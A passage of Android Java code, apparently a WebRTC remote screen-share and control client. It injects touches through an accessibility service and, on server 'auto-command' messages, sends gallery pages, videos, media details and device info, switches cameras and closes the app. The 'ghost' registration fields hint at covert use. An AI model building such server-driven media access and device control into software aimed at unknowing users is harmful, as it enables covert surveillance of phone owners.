                                ansPayload.put("to", activePeer);
                                ansPayload.put("from", myId);
                                ansPayload.put("answer", sdpJson);
                                socket.emit("answer", ansPayload);
                                if (callback != null) callback.onStatusChanged("In Call with " + activePeer, true);
                            } catch (Exception e) {
                                Log.e(TAG, "Error emitting answer", e);
                            }
                        }
                    }, new MediaConstraints());
                }
            }, offer);
        } catch (Exception e) {
            Log.e(TAG, "Error accepting offer", e);
        }
    }

    public void declineIncomingCall() {
        if (activePeer != null && socket != null && socket.connected()) {
            JSONObject payload = new JSONObject();
            try {
                payload.put("from", myId);
                payload.put("to", activePeer);
                socket.emit("end-call", payload);
            } catch (Exception ignored) {}
        }
        incomingOfferObj = null;
        activePeer = null;
    }

    private void createAndSendOffer(String targetUser) {
        if (peerConnection == null) return;
        MediaConstraints constraints = new MediaConstraints();

        peerConnection.createOffer(new SimpleSdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sessionDescription) {
                peerConnection.setLocalDescription(new SimpleSdpObserver(), sessionDescription);
                try {
                    JSONObject offerPayload = new JSONObject();
                    JSONObject sdpJson = new JSONObject();
                    sdpJson.put("type", "offer");
                    sdpJson.put("sdp", sessionDescription.description);
                    boolean sharing = isSharing();
                    sdpJson.put("isScreenShare", sharing);
                    offerPayload.put("to", targetUser);
                    offerPayload.put("from", myId);
                    offerPayload.put("offer", sdpJson);
                    offerPayload.put("isScreenShare", sharing);

                    if (socket != null && socket.connected()) {
                        AppLogs.i(TAG, "Sending call offer: " + myId + " -> " + targetUser + " (screenShare=" + sharing + ")");
                        socket.emit("offer", offerPayload);
                    } else {
                        AppLogs.w(TAG, "Signaling socket not connected yet, queuing offer payload for " + targetUser);
                        pendingOfferPayload = offerPayload;
                    }
                } catch (Exception e) {
                    AppLogs.e(TAG, "Error sending offer: " + e.getMessage(), e);
                }
            }

            @Override
            public void onCreateFailure(String error) {
                AppLogs.e(TAG, "Create offer failed: " + error);
                emitDeviceError("Phone WebRTC Offer failed: " + error);
                if (callback != null) callback.onError("WebRTC Offer failed: " + error);
            }

            @Override
            public void onSetFailure(String error) {
                AppLogs.e(TAG, "Set local SDP failed: " + error);
                emitDeviceError("Phone WebRTC Local SDP failed: " + error);
                if (callback != null) callback.onError("WebRTC SDP failed: " + error);
            }
        }, constraints);
    }

    public void emitDeviceError(String errorMsg) {
        try {
            if (socket != null && socket.connected()) {
                JSONObject payload = new JSONObject();
                payload.put("targetDeviceId", DeviceRegistry.getDeviceId(context));
                payload.put("error", errorMsg);
                payload.put("from", myId);
                socket.emit("device-error", payload);
                Log.w(TAG, "Device error emitted to server: " + errorMsg);
            }
        } catch (Exception ignored) {}
    }

    private void handleRemoteAnswer(JSONObject answerObj) throws Exception {
        SessionDescription answer = new SessionDescription(
                SessionDescription.Type.ANSWER,
                answerObj.getString("sdp")
        );
        peerConnection.setRemoteDescription(new SimpleSdpObserver() {
            @Override
            public void onSetSuccess() {
                drainCandidates();
                Log.i(TAG, "Remote answer set successfully!");
                if (callback != null) callback.onStatusChanged("In Call with " + activePeer, true);
            }
        }, answer);
    }

    private void drainCandidates() {
        for (IceCandidate cand : queuedCandidates) {
            peerConnection.addIceCandidate(cand);
        }
        queuedCandidates.clear();
    }

    private void registerDataChannel(DataChannel channel) {
        channel.registerObserver(new DataChannel.Observer() {
            @Override
            public void onBufferedAmountChange(long l) {}

            @Override
            public void onStateChange() {
                Log.i(TAG, "DataChannel " + channel.label() + " state: " + channel.state());
            }

            @Override
            public void onMessage(DataChannel.Buffer buffer) {
                try {
                    ByteBuffer data = buffer.data;
                    byte[] bytes = new byte[data.remaining()];
                    data.get(bytes);
                    String msg = new String(bytes, StandardCharsets.UTF_8);
                    handleRemoteControlMessage(msg);
                } catch (Throwable t) {
                    Log.e(TAG, "DataChannel onMessage error:", t);
                }
            }
        });
    }

    private void handleRemoteControlMessage(String jsonStr) {
        if (jsonStr == null || jsonStr.trim().isEmpty()) return;
        try {
            JSONObject obj = new JSONObject(jsonStr);
            String type = obj.optString("type", "");
            if (type.isEmpty()) return;

            if (!isFullControlEnabled) {
                AppLog.w(TAG, "Remote gesture ignored (" + type + "): Full Control is OFF (View Only mode)");
                return;
            }

            // Drop gestures if queue backlog exceeds limit to prevent UI thread freezing & memory spikes
            if (pendingGestures.get() >= MAX_PENDING_GESTURES) {
                AppLog.w(TAG, "Dropping remote gesture (" + type + "): backlog reached (" + pendingGestures.get() + ")");
                return;
            }

            // Throttling rapid gestures (e.g., rapid mousemove or dragging events)
            long now = System.currentTimeMillis();
            if ("tap".equals(type) || "swipe".equals(type)) {
                if (now - lastGestureDispatchTime < 25) {
                    return;
                }
                lastGestureDispatchTime = now;
            }

            pendingGestures.incrementAndGet();
            gestureHandler.post(() -> {
                try {
                    if (!isFullControlEnabled) {
                        return;
                    }

                    RemoteAccessibilityService accessibility = RemoteAccessibilityService.getInstance();
                    if (accessibility == null) {
                        AppLog.w(TAG, "⚠️ Remote Touch Ignored: Accessibility Service is not running! (Turn ON 'VRemote Screen Share' in Phone Settings > Accessibility to enable clicks)");
                        if (socket != null && socket.connected()) {
                            try {
                                JSONObject errObj = new JSONObject();
                                errObj.put("targetDeviceId", DeviceRegistry.getDeviceId(context));
                                errObj.put("error", "Touch control requires Accessibility Permission: turn ON 'VRemote Screen Share' in Accessibility Settings");
                                socket.emit("device-error", errObj);
                            } catch (Throwable ignored) {}
                        }
                        return;
                    }

                    AppLog.d(TAG, "Executing gesture: " + type);

                    switch (type) {
                        case "tap": {
                            double rawX = obj.optDouble("x", Double.NaN);
                            double rawY = obj.optDouble("y", Double.NaN);
                            if (Double.isFinite(rawX) && Double.isFinite(rawY)) {
                                float normX = Math.max(0.0f, Math.min(1.0f, (float) rawX));
                                float normY = Math.max(0.0f, Math.min(1.0f, (float) rawY));
                                boolean ok = accessibility.performTap(normX, normY);
                                AppLog.i(TAG, "Tap injected at (" + normX + ", " + normY + ") result=" + ok);
                            }
                            break;
                        }
                        case "swipe": {
                            double rawX1 = obj.optDouble("startX", Double.NaN);
                            double rawY1 = obj.optDouble("startY", Double.NaN);
                            double rawX2 = obj.optDouble("endX", Double.NaN);
                            double rawY2 = obj.optDouble("endY", Double.NaN);
                            if (Double.isFinite(rawX1) && Double.isFinite(rawY1) &&
                                Double.isFinite(rawX2) && Double.isFinite(rawY2)) {
                                float x1 = Math.max(0.0f, Math.min(1.0f, (float) rawX1));
                                float y1 = Math.max(0.0f, Math.min(1.0f, (float) rawY1));
                                float x2 = Math.max(0.0f, Math.min(1.0f, (float) rawX2));
                                float y2 = Math.max(0.0f, Math.min(1.0f, (float) rawY2));
                                long duration = Math.max(100L, Math.min(1000L, obj.optLong("duration", 250L)));
                                boolean ok = accessibility.performSwipe(x1, y1, x2, y2, duration);
                                AppLog.i(TAG, "Swipe injected (" + x1 + "," + y1 + " -> " + x2 + "," + y2 + ") result=" + ok);
                            }
                            break;
                        }
                        case "back": {
                            boolean ok = accessibility.performBack();
                            AppLog.i(TAG, "Back button injected result=" + ok);
                            break;
                        }
                        case "home": {
                            boolean ok = accessibility.performHome();
                            AppLog.i(TAG, "Home button injected result=" + ok);
                            break;
                        }
                        case "recents": {
                            boolean ok = accessibility.performRecentApps();
                            AppLog.i(TAG, "Recent apps injected result=" + ok);
                            break;
                        }
                        case "flip-camera": {
                            switchCompanionCamera();
                            AppLog.i(TAG, "Flipped companion camera");
                            break;
                        }
                    }
                } catch (Throwable e) {
                    AppLog.e(TAG, "Safe catch: error executing gesture [" + type + "]: " + e.getMessage(), e);
                } finally {
                    pendingGestures.decrementAndGet();
                }
            });
        } catch (Throwable e) {
            AppLog.e(TAG, "Safe catch: error handling remote-control message: " + e.getMessage(), e);
        }
    }

    public void setMicrophoneMute(boolean mute) {
        if (localAudioTrack != null) {
            localAudioTrack.setEnabled(!mute);
        }
    }

    public void endCall(boolean notifyServer) {
        boolean wasInCall = (activePeer != null || isScreenSharingCall || peerConnection != null);
        AppLog.i(TAG, "Call ended (wasInCall=" + wasInCall + ", notifyServer=" + notifyServer + ")");
        if (notifyServer && activePeer != null && socket != null && socket.connected()) {
            try {
                JSONObject payload = new JSONObject();
                payload.put("from", myId);
                payload.put("to", activePeer);
                socket.emit("end-call", payload);
            } catch (Exception ignored) {}
        }

        cleanupActiveMediaSession();

        try {
            Intent serviceIntent = new Intent(context, ScreenCaptureService.class);
            context.stopService(serviceIntent);
        } catch (Exception ignored) {}

        isScreenSharingCall = false;
        activePeer = null;
        incomingOfferObj = null;
        pendingOfferPayload = null;

        // Only notify callback if this call was actively running, avoiding recursive loops
        if (wasInCall && callback != null) {
            callback.onCallEnded();
        }
    }

    public boolean isSocketConnected() {
        return socket != null && socket.connected();
    }

    public Socket getSocket() {
        return socket;
    }

    public void setCallback(Callback callback) {
        this.callback = callback;
    }

    public boolean isInCall() {
        return activePeer != null || isScreenSharingCall || peerConnection != null;
    }

    public boolean isScreenSharing() {
        return isScreenSharingCall && screenCapturer != null;
    }

    public void registerDevice() {
        try {
            String deviceId = DeviceRegistry.getDeviceId(context);
            String deviceName = DeviceRegistry.getDeviceModel();
            String ram = DeviceRegistry.getDeviceRam(context);

            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("deviceName", deviceName);
            payload.put("ram", ram);
            payload.put("platform", "android");
            payload.put("role", "companion");
            GhostStateSync.putGhostFields(payload, context);

            if (socket != null && socket.connected()) {
                socket.emit("register-device", payload);
                Log.i(TAG, "Device registered: " + deviceId + " (" + deviceName + ")");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error registering device", e);
        }
    }

    private void listenForAutoCommands() {
        socket.on("auto-command", args -> {
            try {
                JSONObject data = (JSONObject) args[0];
                String command = data.optString("command", "");
                String fromSocketId = data.optString("from", "");
                String caller = data.optString("caller", fromSocketId);
                String cameraChoice = data.optString("cameraChoice", "front");
                boolean streamCamera = !"none".equalsIgnoreCase(cameraChoice);
                AppLog.i(TAG, "Auto-command received: " + command + " from " + caller + " (cam=" + cameraChoice + ")");

                switch (command) {
                    case "end_call":
                        endCall(false);
                        MainActivity act = MainActivity.getInstance();
                        if (act != null) {
                            act.runOnUiThread(() -> {
                                try {
                                    MainActivity current = MainActivity.getInstance();
                                    if (current != null) {
                                        current.stopAllMediaAndFinish();
                                    }
                                } catch (Throwable ignored) {}
                            });
                        }
                        break;
                    case "close_app": {
                        AppLogs.i(TAG, "close_app command received: Swiping away and closing task completely");
                        MainActivity actClose = MainActivity.getInstance();
                        if (actClose != null) {
                            actClose.runOnUiThread(() -> {
                                try {
                                    MainActivity current = MainActivity.getInstance();
                                    if (current != null) {
                                        current.closeAppCompletely();
                                    }
                                } catch (Throwable t) {
                                    try { actClose.finishAffinity(); } catch (Throwable ignored) {}
                                }
                            });
                        }
                        try {
                            if (RemoteAccessibilityService.getInstance() != null) {
                                RemoteAccessibilityService.getInstance().performHome();
                            }
                        } catch (Throwable ignored) {}
                        break;
                    }
                    case "flip_camera":
                    case "switch_camera": {
                        String camChoice = data.optString("cameraChoice", "");
                        if ("front".equalsIgnoreCase(camChoice)) {
                            setCompanionCameraFacing(true);
                        } else if ("back".equalsIgnoreCase(camChoice)) {
                            setCompanionCameraFacing(false);
                        } else if ("none".equalsIgnoreCase(camChoice) || "off".equalsIgnoreCase(camChoice)) {
                            setCompanionCameraEnabled(false);
                        } else {
                            switchCompanionCamera();
                        }
                        break;
                    }
                    case "get_media_detail": {
                        long mediaId = data.optLong("mediaId", 0);
                        String mediaType = data.optString("mediaType", "image");
                        MediaBridge.getMediaItemDetail(context, mediaId, mediaType, socket, fromSocketId);
                        break;
                    }
                    case "get_device_info": {
                        JSONObject info = new JSONObject();
                        info.put("deviceId", DeviceRegistry.getDeviceId(context));
                        info.put("deviceName", DeviceRegistry.getDeviceModel());
                        info.put("ram", DeviceRegistry.getDeviceRam(context));
                        info.put("platform", "android");
                        info.put("targetSocketId", fromSocketId);
                        if (socket != null && socket.connected()) {
                            socket.emit("device-info-response", info);
                        }
                        break;
                    }
                    case "get_gallery": {
                        int page = data.optInt("page", 0);
                        MediaBridge.getGalleryPage(context, page, socket, fromSocketId);
                        break;
                    }
                    case "get_videos": {
                        int page = data.optInt("page", 0);
                        MediaBridge.getVideoPage(context, page, socket, fromSocketId);
                        break;
                    }
                    case "set_speaker": {
                        boolean loud = data.optBoolean("loud", true);
                        setAudioRouting(loud);
                        break;
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error handling auto-command", e);
            }
        });
    }

    public void setAudioRouting(boolean loud) {
        try {
            android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION);
                am.setSpeakerphoneOn(loud);
                Log.i(TAG, "Audio routed: speakerphone=" + loud);
            }
        } catch (Exception e) {
            Log.e(TAG, "Audio routing error", e);
        }
    }

    public void destroy() {
        endCall(true);
        if (socket != null) {
            AppLogs.unregisterSocket(socket);
            socket.disconnect();
            socket = null;
        }
    }

    private static class SimpleSdpObserver implements SdpObserver {
        @Override public void onCreateSuccess(SessionDescription sessionDescription) {}
        @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String s) {
            Log.e("SimpleSdpObserver", "SDP failure: " + s);
        }
        @Override public void onSetFailure(String s) {
            Log.e("SimpleSdpObserver", "SDP set failure: " + s);
        }
    }
}
